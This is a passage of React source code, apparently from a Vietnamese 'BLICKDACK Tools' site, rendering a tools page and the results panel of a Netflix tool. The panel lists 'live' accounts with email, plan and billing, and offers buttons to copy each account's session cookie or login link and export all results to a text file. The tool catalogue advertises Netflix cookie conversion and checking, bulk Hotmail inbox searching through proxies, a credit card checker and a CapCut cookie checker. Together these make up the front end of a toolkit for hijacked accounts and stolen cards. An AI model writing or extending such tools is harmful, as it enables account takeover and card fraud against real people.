                  <span style={{ width: 6, height: 6, borderRadius: "50%", background: "#ff6b9d", boxShadow: "0 0 6px rgba(255,107,157,.6)", flexShrink: 0 }} />
                  \u2705 K\u1ebft qu\u1ea3 Live
                </div>

                {/* Filters */}
                {allCountries.length > 0 && (
                  <div style={{ marginBottom: "6px" }}>
                    <div style={{ fontSize: "8px", color: "rgba(255,182,211,.35)", marginBottom: "3px", letterSpacing: "1px", textTransform: "uppercase", fontWeight: 700 }}>\ud83c\udf0d Qu\u1ed1c gia</div>
                    <div style={{ display: "flex", gap: "5px", flexWrap: "wrap" }}>
                      {["ALL"].concat(allCountries).map(function(c) {
                        var active = batchFilter === c;
                        return <span key={c} onClick={function() { setBatchFilter(c); }} style={{ padding: "3px 9px", borderRadius: "13px", border: "1px solid " + (active ? "rgba(255,107,157,.35)" : "rgba(255,107,157,.12)"), background: active ? "rgba(255,107,157,.15)" : "rgba(255,107,157,.03)", color: active ? "#ffb6d3" : "rgba(255,182,211,.4)", fontSize: "9.5px", fontWeight: 700, cursor: "pointer", textTransform: "uppercase" }}>{c}</span>;
                      })}
                    </div>
                  </div>
                )}
                {allPlans.length > 1 && (
                  <div style={{ marginBottom: "6px" }}>
                    <div style={{ fontSize: "8px", color: "rgba(255,215,0,.4)", marginBottom: "3px", letterSpacing: "1px", textTransform: "uppercase", fontWeight: 700 }}>\ud83d\udc8e G\u00f3i Netflix</div>
                    <div style={{ display: "flex", gap: "5px", flexWrap: "wrap" }}>
                      {["ALL"].concat(allPlans).map(function(p) {
                        var active = batchPlanFilter === p;
                        return <span key={p} onClick={function() { setBatchPlanFilter(p); }} style={{ padding: "3px 9px", borderRadius: "13px", border: "1px solid " + (active ? "rgba(255,215,0,.35)" : "rgba(255,215,0,.12)"), background: active ? "rgba(255,215,0,.15)" : "rgba(255,215,0,.03)", color: active ? "#ffd700" : "rgba(255,215,0,.5)", fontSize: "9.5px", fontWeight: 700, cursor: "pointer", textTransform: "uppercase" }}>{p}</span>;
                      })}
                    </div>
                  </div>
                )}

                {/* Cards */}
                <div style={{ maxHeight: "300px", overflowY: "auto" }}>
                  {filteredBR.map(function(r, idx) {
                    var pb = planBadge(r.plan);
                    return (
                      <div key={idx} style={{ padding: "9px 10px", borderRadius: "9px", border: "1px solid rgba(255,107,157,.06)", background: "rgba(255,255,255,.015)", marginBottom: "5px" }}>
                        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
                          <span style={{ fontSize: isMobile ? "9.5px" : "10.5px", color: "#e0d6f0", fontWeight: 600, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", maxWidth: isMobile ? "160px" : "220px" }}>{r.email}</span>
                          <span style={{ display: "inline-flex", alignItems: "center", gap: 3, padding: "2px 6px", borderRadius: 14, fontSize: 8, fontWeight: 700, background: "rgba(0,255,136,.1)", border: "1px solid rgba(0,255,136,.2)", color: "#00ff88" }}>\u25cf LIVE</span>
                        </div>
                        <div style={{ display: "flex", gap: "8px", flexWrap: "wrap", fontSize: "9.5px", color: "rgba(200,180,220,.4)" }}>
                          <span>\ud83c\udf0d <b style={{ color: "#e0d6f0" }}>{r.country}</b></span>
                          <span>\ud83d\udc8e <span style={{ fontSize: "9px", padding: "2px 7px", background: pb.bg, border: "1px solid " + pb.border, color: pb.color, borderRadius: "14px", fontWeight: 700 }}>{r.plan}</span></span>
                          <span>\ud83c\udf9e <b style={{ color: "#e0d6f0" }}>{r.quality}</b></span>
                        </div>
                        <div style={{ display: "flex", gap: "8px", flexWrap: "wrap", fontSize: "9.5px", color: "rgba(200,180,220,.4)", marginTop: "3px" }}>
                          <span>\ud83d\udcc5 <b style={{ color: "#e0d6f0" }}>{r.billing}</b></span>
                          <span>\u23f3 <b style={{ color: "#e0d6f0" }}>{r.linkExpiry}</b></span>
                        </div>
                        <div style={{ display: "flex", gap: "4px", marginTop: "5px", flexWrap: "wrap" }}>
                          {r.link && (
                            <>
                              <button onClick={function() { handleCopy(r.link); }} style={{ padding: "3px 8px", borderRadius: "5px", border: "1px solid rgba(255,107,157,.12)", background: "rgba(255,107,157,.04)", color: "#ffb6d3", fontSize: "9px", fontWeight: 700, cursor: "pointer" }}>\ud83d\udd17 Copy Link</button>
                              <button onClick={function() { window.open(r.link, "_blank"); }} style={{ padding: "3px 8px", borderRadius: "5px", border: "1px solid rgba(255,107,157,.12)", background: "rgba(255,107,157,.04)", color: "#ffb6d3", fontSize: "9px", fontWeight: 700, cursor: "pointer" }}>\ud83d\ude80 M\u1edf</button>
                            </>
                          )}
                          <button onClick={function() { handleCopy(r.cookie); }} style={{ padding: "3px 8px", borderRadius: "5px", border: "1px solid rgba(255,107,157,.12)", background: "rgba(255,107,157,.04)", color: "#ffb6d3", fontSize: "9px", fontWeight: 700, cursor: "pointer" }}>\ud83c\udf6a Copy Cookie</button>
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Save */}
                {!batchRunning && batchResults.length > 0 && (
                  <div style={{ marginTop: "8px" }}>
                    <button onClick={handleBatchSave} style={{ width: "100%", padding: "8px 14px", borderRadius: "9px", border: "none", background: "linear-gradient(135deg,#ff6b9d,#c850c0,#8a2be2)", color: "#fff", fontSize: "11.5px", fontWeight: 700, cursor: "pointer", textTransform: "uppercase", letterSpacing: ".7px", fontFamily: "'Quicksand',sans-serif" }}>
                      \ud83d\udcbe L\u01b0u to\u00e0n b\u1ed9 k\u1ebft qu\u1ea3 (.txt)
                    </button>
                  </div>
                )}
              </div>
            )}
          </div>
        )}
      </div>

      {/* Toast */}
      <div style={{ position: "fixed", bottom: isMobile ? "80px" : "100px", right: "24px", padding: "8px 20px", borderRadius: "8px", background: "rgba(0,255,136,.1)", border: "1px solid rgba(0,255,136,.2)", color: "#a0f0c0", fontSize: "11px", fontWeight: 700, zIndex: 100010, opacity: toastMsg ? 1 : 0, transform: toastMsg ? "translateY(0)" : "translateY(20px)", transition: "all .35s", backdropFilter: "blur(10px)", maxWidth: isMobile ? "90vw" : "320px", textAlign: "center", pointerEvents: "none" }}>{toastMsg}</div>
    </div>
  );
}


/* ═══════════════════════════════════════════════════
   TOOLS DATA
   ═══════════════════════════════════════════════════ */
const TOOLS = [
  { name: "Netflix", desc: "Convert cookie sang link, check cookie, get info t\u00e0i kho\u1ea3n Netflix", icon: null, logoUrl: NETFLIX_LOGO, color: "#e50914", hasPage: true },
  { name: "Hotmail Inbox Search", desc: "Search th\u01b0 hotmail s\u1ed1 l\u01b0\u1ee3ng l\u1edbn, c\u1ea7n proxy \u0111\u1ec3 ho\u1ea1t \u0111\u1ed9ng \u1ed5n \u0111\u1ecbnh", icon: "\u2709\ufe0f", logoUrl: null, color: "#0078d4" },
  { name: "CC Checker", desc: "Check th\u1ebb credit card, validate BIN, lookup card info", icon: "\ud83d\udcb3", logoUrl: null, color: "#f59e0b" },
  { name: "CAPCUT", desc: "Check cookie CapCut, verify t\u00e0i kho\u1ea3n, get th\u00f4ng tin", icon: null, logoUrl: CAPCUT_LOGO, color: "#00f2ea" },
];

const SIDEBAR_LINKS = [
  { name: "Trang ch\u1ee7", icon: "\ud83c\udfe0", href: "/" },
  { name: "T\u1ea5t c\u1ea3 Tools", icon: "\ud83d\udd27", href: "/tools" },
];

/* ═══════════════════════════════════════════════════
   MAIN TOOLS PAGE
   ═══════════════════════════════════════════════════ */
export default function ToolsPage() {
  const [isLoaded, setIsLoaded] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [hoveredTool, setHoveredTool] = useState(null);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [selectedTool, setSelectedTool] = useState(null);
  const isMobile = useIsMobile();

  useEffect(function() { setIsLoaded(true); }, []);

  var filteredTools = TOOLS.filter(function(tool) {
    return tool.name.toLowerCase().includes(searchQuery.toLowerCase()) || tool.desc.toLowerCase().includes(searchQuery.toLowerCase());
  });

  return (
    <div style={{ minHeight: "100vh", background: "linear-gradient(135deg, #0a0a1a 0%, #0d0d2b 30%, #1a0a2e 60%, #0a0a1a 100%)", fontFamily: "'Quicksand','Inter',sans-serif", display: "flex", position: "relative", overflow: "hidden" }}>

      {/* Glow orbs */}
      <div style={{ position: "absolute", top: "20%", left: "60%", width: 300, height: 300, borderRadius: "50%", background: "#7c3aed", filter: "blur(180px)", opacity: 0.15, pointerEvents: "none" }} />
      <div style={{ position: "absolute", top: "70%", left: "20%", width: 250, height: 250, borderRadius: "50%", background: "#ec4899", filter: "blur(150px)", opacity: 0.1, pointerEvents: "none" }} />

      {/* Mobile hamburger */}
      {isMobile && !selectedTool && (
        <button onClick={function() { setSidebarOpen(!sidebarOpen); }} style={{ position: "fixed", top: 16, left: 16, zIndex: 20, background: "rgba(168,85,247,0.2)", border: "1px solid rgba(168,85,247,0.3)", borderRadius: 10, padding: "10px 12px", cursor: "pointer", backdropFilter: "blur(10px)", WebkitBackdropFilter: "blur(10px)" }}>
          <span style={{ color: "#c084fc", fontSize: 18 }}>{sidebarOpen ? "\u2715" : "\u2630"}</span>
        </button>
      )}

      {/* Mobile overlay */}
      {isMobile && sidebarOpen && <div onClick={function() { setSidebarOpen(false); }} style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.5)", zIndex: 14 }} />}

      {/* Sidebar */}
      {!selectedTool && (
        <aside style={{ width: 240, minHeight: "100vh", background: "rgba(10,10,30,0.8)", borderRight: "1px solid rgba(139,92,246,0.1)", backdropFilter: "blur(20px)", WebkitBackdropFilter: "blur(20px)", padding: "24px 16px", display: "flex", flexDirection: "column", gap: 24, position: isMobile ? "fixed" : "sticky", top: 0, left: isMobile ? (sidebarOpen ? 0 : -260) : 0, zIndex: 15, transition: "left 0.3s ease", flexShrink: 0 }}>
          <a href="/" style={{ fontSize: 20, fontWeight: 800, background: "linear-gradient(135deg, #a855f7, #ec4899, #06b6d4)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent", textDecoration: "none", letterSpacing: "-0.5px" }}>
            \u2726 BLICKDACK
          </a>
          <nav style={{ display: "flex", flexDirection: "column", gap: 4 }}>
            {SIDEBAR_LINKS.map(function(link) {
              return (
                <a key={link.name} href={link.href} onClick={function() { isMobile && setSidebarOpen(false); }} style={{ display: "flex", alignItems: "center", gap: 12, padding: "12px 14px", borderRadius: 10, color: link.href === "/tools" ? "rgba(255,255,255,0.9)" : "rgba(255,255,255,0.6)", textDecoration: "none", fontSize: 14, fontWeight: 500, transition: "all 0.2s", background: link.href === "/tools" ? "rgba(168,85,247,0.15)" : "transparent", borderLeft: link.href === "/tools" ? "3px solid #a855f7" : "3px solid transparent" }}>
                  <span style={{ fontSize: 16 }}>{link.icon}</span>{link.name}
                </a>
              );
            })}
          </nav>
          <div style={{ width: "100%", height: 1, background: "linear-gradient(90deg, transparent, rgba(168,85,247,0.2), transparent)" }} />
          <div style={{ padding: 16, borderRadius: 12, background: "rgba(168,85,247,0.05)", border: "1px solid rgba(168,85,247,0.1)" }}>
            <div style={{ fontSize: 12, color: "#c084fc", fontWeight: 700, marginBottom: 4 }}>\u2726 BLICKDACK Tools</div>
            <div style={{ fontSize: 11, color: "rgba(255,255,255,0.4)", lineHeight: 1.5 }}>B\u1ed9 s\u01b0u t\u1eadp c\u00f4ng c\u1ee5 ti\u1ec7n \u00edch h\u00e0ng \u0111\u1ea7u</div>
          </div>
        </aside>
      )}

      {/* Main */}
      <main style={{ flex: 1, padding: selectedTool ? (isMobile ? "16px 8px" : "24px") : (isMobile ? "70px 16px 24px" : "32px 40px"), maxWidth: selectedTool ? "100%" : 1200, width: "100%", display: "flex", flexDirection: "column", alignItems: selectedTool ? "center" : "stretch" }}>

        {selectedTool === "Netflix" ? (
          <NetflixTool onBack={function() { setSelectedTool(null); }} isMobile={isMobile} />
        ) : (
          <>
            {/* Search */}
            <div style={{ position: "relative", marginBottom: 24 }}>
              <span style={{ position: "absolute", left: 16, top: "50%", transform: "translateY(-50%)", color: "rgba(255,255,255,0.3)", fontSize: 16, pointerEvents: "none" }}>\ud83d\udd0d</span>
              <input type="text" placeholder="T\u00ecm ki\u1ebfm tool..." value={searchQuery} onChange={function(e) { setSearchQuery(e.target.value); }} style={{ width: "100%", padding: "14px 16px 14px 44px", borderRadius: 14, border: "1px solid rgba(168,85,247,0.2)", background: "rgba(168,85,247,0.05)", color: "#ffffff", fontSize: 14, outline: "none", backdropFilter: "blur(10px)", WebkitBackdropFilter: "blur(10px)", boxSizing: "border-box" }} onFocus={function(e) { e.target.style.borderColor = "rgba(168,85,247,0.5)"; e.target.style.boxShadow = "0 0 20px rgba(168,85,247,0.15)"; }} onBlur={function(e) { e.target.style.borderColor = "rgba(168,85,247,0.2)"; e.target.style.boxShadow = "none"; }} />
            </div>

            {/* Banner */}
            <div style={{ borderRadius: 20, overflow: "hidden", position: "relative", marginBottom: 28, height: isMobile ? 130 : 170, border: "1px solid rgba(168,85,247,0.2)" }}>
              <img src={ANIME_DECOR_1} alt="" style={{ width: "100%", height: "100%", objectFit: "cover", display: "block" }} />
              <div style={{ position: "absolute", inset: 0, background: "linear-gradient(90deg, rgba(10,10,26,0.92) 0%, rgba(10,10,26,0.5) 50%, transparent 100%)" }} />
              <div style={{ position: "absolute", bottom: isMobile ? 16 : 24, left: isMobile ? 16 : 28 }}>
                <div style={{ fontSize: isMobile ? 18 : 24, fontWeight: 800, color: "#fff", marginBottom: 4 }}>\u2726 BLICKDACK Tools</div>
                <div style={{ color: "rgba(255,255,255,0.5)", fontSize: isMobile ? 12 : 14 }}>B\u1ed9 s\u01b0u t\u1eadp c\u00f4ng c\u1ee5 ti\u1ec7n \u00edch h\u00e0ng \u0111\u1ea7u</div>
              </div>
            </div>

            {/* Tools Grid */}
            <div style={{ display: "grid", gridTemplateColumns: isMobile ? "1fr" : "repeat(auto-fill, minmax(280px, 1fr))", gap: 16, opacity: isLoaded ? 1 : 0, transition: "opacity 0.6s ease-out" }}>
              {filteredTools.map(function(tool, i) {
                var isHovered = hoveredTool === i;
                return (
                  <div key={i} onMouseEnter={function() { setHoveredTool(i); }} onMouseLeave={function() { setHoveredTool(null); }} onClick={function() { if (tool.hasPage) setSelectedTool(tool.name); }} style={{ padding: 24, borderRadius: 16, background: isHovered ? "rgba(168,85,247,0.1)" : "rgba(168,85,247,0.03)", border: "1px solid " + (isHovered ? "rgba(168,85,247,0.3)" : "rgba(168,85,247,0.08)"), cursor: tool.hasPage ? "pointer" : "default", transition: "all 0.3s ease", transform: isHovered ? "translateY(-4px)" : "translateY(0)", boxShadow: isHovered ? "0 0 30px " + tool.color + "22, 0 10px 40px rgba(0,0,0,0.3)" : "none", position: "relative", overflow: "hidden" }}>
                    <div style={{ position: "absolute", top: -20, right: -20, width: 80, height: 80, borderRadius: "50%", background: tool.color, filter: "blur(40px)", opacity: isHovered ? 0.2 : 0.05, transition: "opacity 0.3s", pointerEvents: "none" }} />
                    <div style={{ marginBottom: 14, display: "flex", alignItems: "center", height: 40 }}>
                      {tool.logoUrl ? <img src={tool.logoUrl} alt={tool.name} style={{ height: 32, width: "auto", maxWidth: 100, objectFit: "contain", filter: tool.name === "CAPCUT" ? "brightness(0) invert(1)" : "drop-shadow(0 0 8px " + tool.color + "66)" }} /> : <span style={{ fontSize: 32 }}>{tool.icon}</span>}
                    </div>
                    <h3 style={{ fontSize: 16, fontWeight: 700, color: "#ffffff", marginBottom: 6 }}>{tool.name}</h3>
                    <p style={{ fontSize: 13, color: "rgba(255,255,255,0.4)", lineHeight: 1.5, paddingRight: 24 }}>{tool.desc}</p>
                    <div style={{ position: "absolute", bottom: 20, right: 20, color: tool.color, fontSize: 18, opacity: isHovered ? 1 : 0.3, transition: "opacity 0.3s, transform 0.3s", transform: isHovered ? "translateX(4px)" : "translateX(0)" }}>\u2192</div>
                  </div>
                );
              })}
            </div>

            {filteredTools.length === 0 && (
              <div style={{ textAlign: "center", padding: "60px 20px", color: "rgba(255,255,255,0.4)" }}>
                <div style={{ fontSize: 48, marginBottom: 16 }}>\ud83d\udd0d</div>
                <div style={{ fontSize: 16 }}>Kh\u00f4ng t\u00ecm th\u1ea5y tool n\u00e0o ph\u00f9 h\u1ee3p</div>
              </div>
            )}

            <div style={{ display: "flex", justifyContent: "center", marginTop: 40, marginBottom: 24 }}>
              <div style={{ width: isMobile ? 100 : 160, height: 2, background: "linear-gradient(90deg, transparent, #a855f7, #ec4899, #a855f7, transparent)", borderRadius: 2, boxShadow: "0 0 20px rgba(168,85,247,0.4)" }} />
            </div>
          </>
        )}
      </main>

      {/* Global styles */}
      <style jsx global>{`
        @import url('https://fonts.googleapis.com/css2?family=Zen+Maru+Gothic:wght@400;700;900&family=Quicksand:wght@400;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a1a; }
        input::placeholder { color: rgba(255,255,255,0.3); }
        textarea::placeholder { color: rgba(200,180,220,.28); }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(168,85,247,0.3); border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(168,85,247,0.5); }
      `}</style>
    </div>
  );
}
